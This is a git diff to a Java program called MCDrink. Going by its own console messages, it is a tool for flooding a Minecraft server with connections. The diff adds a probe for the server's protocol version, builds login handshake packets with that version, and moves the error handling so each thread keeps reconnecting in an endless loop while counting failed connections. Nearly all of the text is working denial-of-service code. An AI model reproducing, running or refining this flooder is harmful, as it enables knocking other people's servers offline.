@@ -8,6 +8,9 @@ import java.net.Socket;
 import java.net.UnknownHostException;
 import java.util.Scanner;
 
+import com.google.gson.JsonElement;
+import com.google.gson.JsonParser;
+
 public class main {
 	public static long data=0;
 	public static String[] part1;
@@ -16,6 +19,8 @@ public class main {
 	public static byte[] login;
 	public static byte[] ping;
 	public static byte[] pack;
+	public static int version=-1;
+	public static long killT=0;
 	public static void main(String[] args) {
 		// TODO 自动生成的方法存根
 		System.out.println("欢迎使用MCDrink,作者:Mr.cacti,github:https://github.com/greyCloudTeam/MCDrink,QQ:3102733279");
@@ -29,8 +34,6 @@ public class main {
 		main.port=Integer.parseInt(part1[1]);
 		int num=Integer.parseInt(threadNum);
 		System.out.println("正在存入缓存");
-		
-		
 		
 		//握手包数据流初始化
 		ByteArrayOutputStream b ;
@@ -53,16 +56,6 @@ public class main {
 			handshake.writeLong(Long.MAX_VALUE);
 			ping=b.toByteArray();
 			
-			b= new ByteArrayOutputStream();
-			handshake = new DataOutputStream(b);
-			handshake.write(0x00);
-			main.writeVarInt(handshake,-1);//版本号未知
-			main.writeVarInt(handshake,main.part1[0].length()); //ip地址长度
-			handshake.writeBytes(main.part1[0]); //ip
-			handshake.writeShort(main.port); //port
-			main.writeVarInt(handshake, 2); //state (1 for handshake)
-			login=b.toByteArray();
-			
 			b = new ByteArrayOutputStream();
 			handshake = new DataOutputStream(b);
 			handshake.write(0x00);
@@ -73,10 +66,58 @@ public class main {
 			e.printStackTrace();
 		}//先握手
 		
+		System.out.println("正在探测版本..");
 		
+		try {
+				Socket s1=new Socket(main.part1[0],main.port);
+				//流准备
+				InputStream is=s1.getInputStream();
+				DataInputStream di=new DataInputStream(is);
+				OutputStream os=s1.getOutputStream();
+				DataOutputStream dos=new DataOutputStream(os);
+				
+				//握手
+				main.writeVarInt(dos, main.hand.length); //prepend size
+				dos.write(main.hand); //write handshake packet
+				//跟小包
+				main.writeVarInt(dos, main.pack.length); //prepend size
+				dos.write(main.pack); //write handshake packet
+				dos.flush();
+				
+				main.data=main.data+main.readVarInt(di);//读包大小
+				main.readVarInt(di);
+				byte[] temp1=new byte[main.readVarInt(di)];
+				di.readFully(temp1);
 		
+				String motdT=new String(temp1);
+				JsonParser json=new JsonParser();
+	            JsonElement part5 = json.parse(motdT);
+	            JsonElement part6=part5.getAsJsonObject().get("version");
+	            System.out.println("服务器版本:"+part6.getAsJsonObject().get("name").getAsString()+",协议版本号:"+part6.getAsJsonObject().get("protocol").getAsInt());
+	            version=part6.getAsJsonObject().get("protocol").getAsInt();
+				
+				di.close();
+				is.close();
+				dos.close();
+				os.close();
+				s1.close();
+		} catch (Exception e) {
+			System.out.println("探测失败！"+e.getMessage());
+		}
 		
-		
+		try {
+			b= new ByteArrayOutputStream();
+			handshake = new DataOutputStream(b);
+			handshake.write(0x00);
+			main.writeVarInt(handshake,version);//版本号未知
+			main.writeVarInt(handshake,main.part1[0].length()); //ip地址长度
+			handshake.writeBytes(main.part1[0]); //ip
+			handshake.writeShort(main.port); //port
+			main.writeVarInt(handshake, 2); //state (1 for handshake)
+			login=b.toByteArray();
+		}catch(Exception e) {
+			e.printStackTrace();
+		}
 		System.out.println("准备完毕,正在启动线程,长时间显示\"[AnotherThread]>0byte\"信息则为攻击失败");
 		Runnable thread4 = new Thread4(); 
 		Thread thread3 = new Thread(thread4);
@@ -113,8 +154,8 @@ public class main {
 class Thread1 implements Runnable {
 	@Override
 	public void run() {
-		try {
 			while(true) {
+				try {
 				Socket s=new Socket(main.part1[0],main.port);
 				//流准备
 				InputStream is=s.getInputStream();
@@ -130,6 +171,7 @@ class Thread1 implements Runnable {
 				main.writeVarInt(dos, main.pack.length); //prepend size
 				dos.write(main.pack); //write handshake packet
 				dos.flush();
+				
 				main.data=main.data+main.readVarInt(di);//读包大小
 				main.readVarInt(di);
 				byte[] temp1=new byte[main.readVarInt(di)];
@@ -164,16 +206,13 @@ class Thread1 implements Runnable {
 				dos.close();
 				os.close();
 				s.close();
+				} catch (Exception e) {
+					// TODO 自动生成的 catch 块
+					//e.printStackTrace();
+					main.killT++;
+					//e.printStackTrace();
+				}
 			}
-		} catch (Exception e) {
-			// TODO 自动生成的 catch 块
-			//e.printStackTrace();
-			Runnable thread1 = new Thread1(); 
-			Thread thread2 = new Thread(thread1);
-			thread2.start();//重生!
-			System.out.println("[WARNING]线程自爆,正在复活...."+e.getMessage());
-			e.printStackTrace();
-		}
 	}
 }
 
@@ -183,23 +222,23 @@ class Thread4 implements Runnable {
 		try {
 			while(true) {
 				Thread.sleep(3000);
-				if(main.data<1024) {
-					System.out.println("[AnotherThread]>"+main.data+"byte");
-					continue;
-				}
-				if(main.data>=1024) {
-					double a=main.data/1024.0;
-					System.out.println("[AnotherThread]>"+a+"kb");
+				if(main.data>=1024*1024*1024) {
+					double a=main.data/(1024.0*1024.0*1024.0);
+					System.out.println("[AnotherThread]>"+a+"kb,"+main.killT+"thread");
 					continue;
 				}
 				if(main.data>=1024*1024) {
 					double a=main.data/(1024.0*1024.0);
-					System.out.println("[AnotherThread]>"+a+"mb");
+					System.out.println("[AnotherThread]>"+a+"mb,"+main.killT+"thread");
 					continue;
 				}
-				if(main.data>=1024*1024*1024) {
-					double a=main.data/(1024.0*1024.0*1024.0);
-					System.out.println("[AnotherThread]>"+a+"kb");
+				if(main.data>=1024) {
+					double a=main.data/1024.0;
+					System.out.println("[AnotherThread]>"+a+"kb,"+main.killT+"thread");
+					continue;
+				}
+				if(main.data<1024) {
+					System.out.println("[AnotherThread]>"+main.data+"byte,"+main.killT+"thread");
 					continue;
 				}
 			}
